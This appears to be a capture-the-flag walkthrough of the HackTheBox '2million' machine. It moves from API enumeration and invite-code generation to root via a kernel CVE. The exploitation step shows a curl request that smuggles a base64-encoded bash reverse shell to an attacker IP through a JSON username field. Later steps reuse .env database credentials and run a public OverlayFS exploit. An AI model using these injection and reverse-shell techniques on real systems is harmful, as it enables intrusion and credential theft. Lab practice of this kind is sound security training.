## IP
Target: 2million.htb

## OS / Technology
- Ubuntu

## Users / Passwords
- TBD during exploitation

## Services
- **80 HTTP**
  - Hostname: `2million.htb`
  - Source code: nothing interesting
  - Fuzzing: no results
  - Login page: tested SQL injection on email/password, not injectable
  - `/invite` page shows message: "feel free to hack your way in"
  - JavaScript contained obfuscated code → deobfuscated to show API endpoints
- **22 SSH**
  - Open, but no creds initially

## Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
```

## Invite Code Enumeration
Deobfuscated JS revealed `/api/v1/invite/verify` and `/api/v1/invite/how/to/generate`.  
- First request:
```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate -H 'X-Requested-With: XMLHttpRequest'
```
Response (ROT13 encoded). After decoding, pointed to `/api/v1/invite/generate`.

- Second request:
```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate -H 'X-Requested-With: XMLHttpRequest'
```
Returned base64 invite code. Decoding gave:
```
EC73C-9F5K5-56ET4-WC3M5
```

- Used invite code to register an account and login.

## API Discovery
Using curl fuzzing discovered the following API structure:
```
/api/v1/user
  - /invite/* endpoints
  - /user/auth
  - /user/vpn/* endpoints
  - register, login

/api/v1/admin
  - GET /auth
  - POST /vpn/generate
  - PUT /settings/update
```

## Exploitation
- Crafted malicious POST request against `/api/v1/admin/vpn/generate`:
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate   --cookie "PHPSESSID=..."   -H "Content-Type: application/json"   -d '{"username":"yanser;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzEyMzQgMD4mMQ== | base64 -d | bash;"}'
```
- Got reverse shell as `www-data`.

## Post-Exploitation
- Found `.env` file containing MySQL credentials:
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

- Used creds to escalate → shell as **admin**.  
- Retrieved **user flag**.

## Privilege Escalation
- Found email mentioning kernel CVE in OverlayFS/FUSE.  
- Confirmed vulnerable kernel version.  
- Used [CVE-2023-0386 OverlayFS exploit](https://github.com/puckiestyle/CVE-2023-0386).  
- Compiled and executed, gaining root.
